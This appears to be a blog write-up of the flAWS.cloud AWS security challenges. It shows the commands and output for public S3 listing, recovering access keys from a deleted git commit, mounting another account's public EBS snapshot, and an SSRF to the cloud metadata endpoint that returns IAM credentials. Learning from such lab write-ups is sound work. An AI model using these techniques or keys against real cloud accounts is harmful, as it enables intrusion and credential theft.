---
title: "flAWS.cloud Writeup"
date: 2020-08-17T10:22:46-04:00
draft: false
---

This post is a quick writeup of going through the challenges at http://flaws.cloud. These challenges demonstrate vulnerabilities that commonly happen in AWS environments and are a great time!

---
### Challenge 1:

At `flaws.cloud` you need to do a little recon. I'm sort of bad at this, so I checked the hint, which suggest poking around with `dig`. So I ran:
```shell
  |2.6.3| NY-Floater-15565 in ~/workspace/flaws
○ → dig flaws.cloud

; <<>> DiG 9.10.6 <<>> flaws.cloud
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 8743
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;flaws.cloud.			IN	A

;; ANSWER SECTION:
flaws.cloud.		5	IN	A	52.218.236.18

;; Query time: 36 msec
;; SERVER: 192.168.1.1#53(192.168.1.1)
;; WHEN: Mon Aug 17 10:08:41 EDT 2020
;; MSG SIZE  rcvd: 56
```

Ah! lets check that ip out:
```shell
○ → nslookup 52.218.236.18
Server:		192.168.1.1
Address:	192.168.1.1#53

Non-authoritative answer:
18.236.218.52.in-addr.arpa	name = s3-website-us-west-2.amazonaws.com.

Authoritative answers can be found from:

```

Ok, so we know the site is hosted on s3. Lets see what we can see in the bucket:
```shell
○ → aws s3 ls s3://flaws.cloud  --no-sign-request
2017-03-13 23:00:38       2575 hint1.html
2017-03-02 23:05:17       1707 hint2.html
2017-03-02 23:05:11       1101 hint3.html
2020-05-22 14:16:45       3162 index.html
2018-07-10 12:47:16      15979 logo.png
2017-02-26 20:59:28         46 robots.txt
2017-02-26 20:59:30       1051 secret-dd02c7c.html

```
Bingo! Navigate to http://flaws.cloud/secret-dd02c7c.html for the second challenge.

### Challenge 2 and 3

These both involve s3 ls, but require an authenticated user. Challenge 2 is basically the same as 1. Challenge 3 presents us with the following:
```shell
○ → aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
                           PRE .git/
2017-02-26 19:14:33     123637 authenticated_users.png
2017-02-26 19:14:34       1552 hint1.html
2017-02-26 19:14:34       1426 hint2.html
2017-02-26 19:14:35       1247 hint3.html
2017-02-26 19:14:33       1035 hint4.html
2020-05-22 14:21:10       1861 index.html
2017-02-26 19:14:33         26 robots.txt
```
Interesting! I wonder what's in the git history?!

```shell
aws s3 cp --recursive s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ ./git/
± zm |master U:1 ✗| → git show b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

diff --git a/access_keys.txt b/access_keys.txt
deleted file mode 100644
index e3ae6dd..0000000
--- a/access_keys.txt
+++ /dev/null
@@ -1,2 +0,0 @@
-access_key AKIAJ366LIPB4IJKT7SA
-secret_access_key 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
```

We can now use that account and configure it. For convenience I do as follows:
```shell
± zm+mc |master U:1 ✗| → aws configure --profile flaws3
AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key [None]: 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
Default region name [None]: us-west-2
Default output format [None]:

  |2.6.3| NY-Floater-15565 in ~/workspace/flaws/git
± zm |master U:1 ✗| → export AWS_PROFILE=flaws3

± zm |master U:1 ✗| → aws s3api list-buckets
{
    "Buckets": [
        {
            "Name": "2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud",
            "CreationDate": "2020-06-25T17:43:56+00:00"
        },
        {
            "Name": "config-bucket-975426262029",
            "CreationDate": "2020-06-26T23:06:07+00:00"
        },
        {
            "Name": "flaws-logs",
            "CreationDate": "2020-06-27T10:46:15+00:00"
        },
        {
            "Name": "flaws.cloud",
            "CreationDate": "2020-06-27T10:46:15+00:00"
        },
        {
            "Name": "level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud",
            "CreationDate": "2020-06-27T15:27:14+00:00"
        },
        {
            "Name": "level3-9afd3927f195e10225021a578e6f78df.flaws.cloud",
            "CreationDate": "2020-06-27T15:27:14+00:00"
        },
        {
            "Name": "level4-1156739cfb264ced6de514971a4bef68.flaws.cloud",
            "CreationDate": "2020-06-27T15:27:14+00:00"
        },
        {
            "Name": "level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud",
            "CreationDate": "2020-06-27T15:27:15+00:00"
        },
        {
            "Name": "level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud",
            "CreationDate": "2020-06-27T15:27:15+00:00"
        },
        {
            "Name": "theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud",
            "CreationDate": "2020-06-28T02:29:47+00:00"
        }
    ],
    "Owner": {
        "DisplayName": "0xdabbad00",
        "ID": "d70419f1cb589d826b5c2b8492082d193bca52b1e6a81082c36c993f367a5d73"
    }
}

```
Bam! We're in!

### Challenge 4
This one gets a bit tricky!
On so we've got the url and it tells us there's and instance running.
Getting the url gets us nothing, just a password protected gateway.
Hint1 suggests looking for a snapshot...interesting!

Ok so let filter this a bit more:
```shell
± zm |master U:1 ✗| → aws sts get-caller-identity
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}

± zm |master U:1 ✗| → aws ec2 describe-snapshots --owner-id 975426262029
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ]
        }
    ]
}
```
Nice!
With a snapshot in AWS, you can create a volume and attache it to an instance. (I had to do this once for some bebugging of a failed deployment. I couldn't ssh onto the instances or get their logs, so I snapshotted them and attached that to a quick instance.) 
Now that we've got it hooked up, let check it out. We're going to have to mount the device:
```shell
ubuntu@ip-172-31-2-86:~$ lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0     7:0    0   97M  1 loop /snap/core/9665
loop1     7:1    0 28.1M  1 loop /snap/amazon-ssm-agent/2012
xvda    202:0    0    8G  0 disk
└─xvda1 202:1    0    8G  0 part /
xvdf    202:80   0  100G  0 disk
└─xvdf1 202:81   0    8G  0 part

ubuntu@ip-172-31-2-86:~$ sudo mount /dev/xvdf1 /mnt

```

Now lets poke around. I usually start in `var` and tab around. Ultimately I found:
```shell
ubuntu@ip-172-31-2-86:/mnt$ cat /mnt/var/www/html/index.html
<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
        </style>
    </head>
<body
  text="#00d000"
  bgcolor="#000000"
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">
<center>
<pre>
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>
<h1>flAWS - Level 5</h1>
</center>


Good work getting in.  This level is described at <a href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/">http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</a>
```
Woot! 📯 🥳

### Challenge 5

This challenge involves a proxy and the magic cloud metadata ip.
For example going to http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/ shows you what you can access. IAM is always interesting....

http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws

```json
{
  "Code" : "Success",
  "LastUpdated" : "2020-08-17T17:24:58Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQG5FNCWBQF",
  "SecretAccessKey" : "e+w4TLCSzX+rgW3J7izBSL2qRH661cMkLR33lrUK",
  "Token" : "IQoJb3JpZ2luX2VjEBoaCXVzLXdlc3QtMiJGMEQCIFcwVEeTYx6HaSDuKPk2Jfz1jSvlcvqPo6AvUHka5gu9AiBkI5jENgREyfLxvLVKTHe+Se2nfAOIthhp/KkNuuS5Iyq9Awjz//////////8BEAEaDDk3NTQyNjI2MjAyOSIMS9Ir3VgBa2MkAlwaKpEDIuFjwan2FmgGcPBlC+XKdkPrkWDwLYQqZKAXSKH+3FJJuSe80VDoQh/d/dOjSW75YKKgSDiG9CzppsfGkMhiu/Irp1tJfOCwxwZfmOEF07DEKVwl6gzSUAr7Hr03hWIKhuihPT3op/YgjVXIE1+QJrX0hpOoiWgvnUpVSo7+9agU89C67JWN7unAJ7Yk/6r+dvbfO9N41TGiALlYSjj226CmCHnhPGeQI/6PGDeXBTdiw3DyaJXlyg8GdoJPYSuRgUmUpqOusEomkF9QK4D7K6JF5Z6elunN5cY8oFU8sIgn4xlD/cfUMCNreVnJ38vu9aD7X4oVRc3ykC9xdzinwdGFnzcYZq9NZO6cP2IbLmZjjJYVGfnTbatBVS0d9ou/ZYqCd0cx4Wq0ZqWagGTmRDdpXEWbntpZtP0R1UaidqxZoJGEK3csaQHO7k6Un2c5Es+jwGsqr5ccm1TJsSKaTArNgA520XdapRo4MOjzGCsIAJqXF3XiC0GHouN8HFnus7zXNgC8sqJ++4EsyRksPfEw5/rq+QU67AGFzTLYH41jRefF6IUv6KbxWy0KmCEBn4bbn2UR6HUuXrei+XIXGgzNceyBwMiTPIfDH6TfSMJg8x/9cb0EULxh/0OOP6wqVP1soZWddikhLBR4/Z2LubpPYAyon8LW9K/wvl/Il5yuRr6X4nJCDX1aeCp7E7LAqytX9x9IV5tM6oDGFQr+0yAn0auTtu4o8Lw/KOZjZeYmSGkYvZHje4ehE6YEf4Gsq+txNrfWeEDTV0pObgJigF3XobvsZmxoOo/ZK0KLjiSxI84zOJoLa8EEAhMVmPpfUvS3uxzzsotAsrYmBIrbf0oegnA2Ww==",
  "Expiration" : "2020-08-17T23:48:20Z"
}
```

We can then pop those into a profile and enumerate the bucket:
```shell
± zm |master U:1 ?:1 ✗| → aws s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
                           PRE ddcc78ff/
2017-02-26 21:11:07        871 index.html
```

Access that subdir and you're in!

### Level 6

This one was a bit obscure for me, honestly, but it was a lesson in the fact that even simple read permissions given out too liberally can be a major flaws. Its equivalent to dumping a stack trace for an app - just more information an attacker can use to find flaws.


Thats all folks!!!  

